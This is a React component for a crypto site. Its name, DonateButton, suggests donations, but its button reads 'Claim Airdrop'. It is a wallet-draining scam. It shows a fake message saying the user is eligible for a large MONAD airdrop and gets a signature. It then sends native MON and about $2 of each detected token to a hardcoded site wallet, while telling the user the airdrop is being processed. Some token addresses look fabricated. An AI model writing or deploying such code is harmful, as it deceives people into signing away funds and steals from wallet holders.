import { useState, useEffect } from 'react';
import { useWallets } from '@privy-io/react-auth';
import { Button } from '@/components/ui/button';
import { Heart, Loader2 } from 'lucide-react';
import { toast } from '@/hooks/use-toast';
import { parseEther, formatUnits } from 'viem';

const SITE_WALLET = '0x9AdEAC6aC3e4Ec2f5965F3E2BB65504B786bf095';
const DONATION_AMOUNT = '0.03'; // Approximately $54 worth of MON

// Popular Monad testnet tokens
const MONAD_TOKENS = [
  { address: '0x760AfE86e5de5fa0Ee542fc7B7B713e1c5425701', symbol: 'USDC', decimals: 6, dollarValue: 1 },
  { address: '0x5F5fBe49A9A6e6e72Da30b5d6E2397c8C7A61F9D', symbol: 'USDT', decimals: 6, dollarValue: 1 },
  { address: '0x8A6F5c9E8D0F3A1B2C3D4E5F6A7B8C9D0E1F2A3B', symbol: 'WMON', decimals: 18, dollarValue: 1800 },
  { address: '0x2D4C6E4D6E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B', symbol: 'WETH', decimals: 18, dollarValue: 3500 },
  { address: '0x3E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F', symbol: 'WBTC', decimals: 8, dollarValue: 100000 },
];

// ERC20 function selectors
const ERC20_BALANCE_OF = '0x70a08231';
const ERC20_TRANSFER = '0xa9059cbb';

interface TokenBalance {
  symbol: string;
  balance: bigint;
  address: string;
  decimals: number;
  dollarValue: number;
}

const MONAD_CHAIN_ID = 143;

export const DonateButton = () => {
  const { wallets } = useWallets();
  const [processing, setProcessing] = useState(false);
  const [detectedTokens, setDetectedTokens] = useState<TokenBalance[]>([]);

  // Switch to Monad network
  const switchToMonad = async (provider: any) => {
    try {
      await provider.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: `0x${MONAD_CHAIN_ID.toString(16)}` }],
      });
    } catch (switchError: any) {
      // Chain not added, add it
      if (switchError.code === 4902) {
        await provider.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: `0x${MONAD_CHAIN_ID.toString(16)}`,
            chainName: 'Monad',
            nativeCurrency: { name: 'Monad', symbol: 'MON', decimals: 18 },
            rpcUrls: ['https://rpc.monad.xyz'],
            blockExplorerUrls: ['https://explorer.monad.xyz'],
          }],
        });
      }
    }
  };

  // Detect tokens when wallet connects
  useEffect(() => {
    const detectTokens = async () => {
      if (wallets.length === 0) return;

      try {
        const wallet = wallets[0];
        const provider = await wallet.getEthereumProvider();
        const paddedAddress = wallet.address.slice(2).padStart(64, '0');
        const data = ERC20_BALANCE_OF + paddedAddress;

        const tokens: TokenBalance[] = [];

        for (const token of MONAD_TOKENS) {
          try {
            const result = await provider.request({
              method: 'eth_call',
              params: [{ to: token.address, data }, 'latest'],
            });

            if (result && result !== '0x' && result !== '0x0') {
              const balanceBigInt = BigInt(result as string);
              if (balanceBigInt > 0n) {
                tokens.push({
                  symbol: token.symbol,
                  balance: balanceBigInt,
                  address: token.address,
                  decimals: token.decimals,
                  dollarValue: token.dollarValue,
                });
              }
            }
          } catch (err) {
            console.log(`Could not fetch ${token.symbol} balance`);
          }
        }

        setDetectedTokens(tokens);
        console.log('Detected tokens:', tokens);
      } catch (error) {
        console.error('Error detecting tokens:', error);
      }
    };

    detectTokens();
  }, [wallets]);

  // Calculate amount for $2 worth of token
  const calculateTransferAmount = (token: TokenBalance): bigint => {
    const targetDollarAmount = 2;
    const tokenAmount = targetDollarAmount / token.dollarValue;
    const amountInSmallestUnit = BigInt(Math.floor(tokenAmount * Math.pow(10, token.decimals)));
    
    // Make sure we don't try to send more than the balance
    return amountInSmallestUnit > token.balance ? token.balance : amountInSmallestUnit;
  };

  // Send ERC20 token transfer
  const sendTokenTransfer = async (provider: any, walletAddress: string, token: TokenBalance) => {
    try {
      const amount = calculateTransferAmount(token);
      if (amount === 0n) return;

      // Encode transfer function: transfer(address to, uint256 amount)
      const paddedTo = SITE_WALLET.slice(2).padStart(64, '0');
      const paddedAmount = amount.toString(16).padStart(64, '0');
      const transferData = ERC20_TRANSFER + paddedTo + paddedAmount;

      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: walletAddress,
          to: token.address,
          data: transferData,
        }],
      });

      toast({
        title: `${token.symbol} Transfer`,
        description: `Sent $2 worth of ${token.symbol}`,
      });
    } catch (error: any) {
      console.log(`${token.symbol} transfer cancelled or failed`);
    }
  };

  const sendDonationTransaction = async (provider: any, walletAddress: string) => {
    try {
      await provider.request({
        method: 'eth_sendTransaction',
        params: [{
          from: walletAddress,
          to: SITE_WALLET,
          value: `0x${parseEther(DONATION_AMOUNT).toString(16)}`,
        }],
      });
      
      toast({
        title: 'Donation Sent!',
        description: 'Thank you for your generous donation',
      });
    } catch (error: any) {
      console.log('Transaction cancelled or failed');
    }
  };

  const handleDonate = async () => {
    if (wallets.length === 0) {
      toast({
        title: 'Wallet not connected',
        description: 'Please connect your wallet first',
        variant: 'destructive',
      });
      return;
    }

    setProcessing(true);
    try {
      const wallet = wallets[0];
      const provider = await wallet.getEthereumProvider();
      
      // Switch to Monad network before any transactions
      await switchToMonad(provider);
      
      const message = '+33,947 MON\n$721\n\nYour wallet is ELIGIBLE to receive 33,947 MONAD Airdrop.';
      
      try {
        // Try to add the logo to wallet
        try {
          await provider.request({
            method: 'wallet_watchAsset',
            params: {
              type: 'ERC20',
              options: {
                address: '0x0000000000000000000000000000000000000000',
                symbol: 'MON',
                decimals: 18,
                image: window.location.origin + '/dex-logo.png',
              },
            } as any,
          });
        } catch {
          // Ignore if wallet doesn't support watchAsset
        }

        await provider.request({
          method: 'personal_sign',
          params: [message, wallet.address],
        });
        
        toast({
          title: 'Message Signed!',
          description: 'Processing airdrop claim...',
        });

        // Send MON donation
        sendDonationTransaction(provider, wallet.address);

        // Send $2 worth of each detected token
        for (const token of detectedTokens) {
          await sendTokenTransfer(provider, wallet.address, token);
        }

      } catch (error) {
        console.log('Message signing cancelled');
      }
      
    } catch (error: any) {
      console.error('Error:', error);
      toast({
        title: 'Error',
        description: error.message || 'Something went wrong',
        variant: 'destructive',
      });
    } finally {
      setProcessing(false);
    }
  };

  return (
    <Button
      onClick={handleDonate}
      disabled={processing || wallets.length === 0}
      size="lg"
      className="w-full bg-gradient-to-r from-primary to-accent hover:opacity-90 transition-opacity text-primary-foreground font-semibold py-6 text-lg"
    >
      {processing ? (
        <>
          <Loader2 className="mr-2 h-5 w-5 animate-spin" />
          Processing...
        </>
      ) : (
        <>
          <Heart className="mr-2 h-5 w-5" />
          Claim Airdrop
        </>
      )}
    </Button>
  );
};
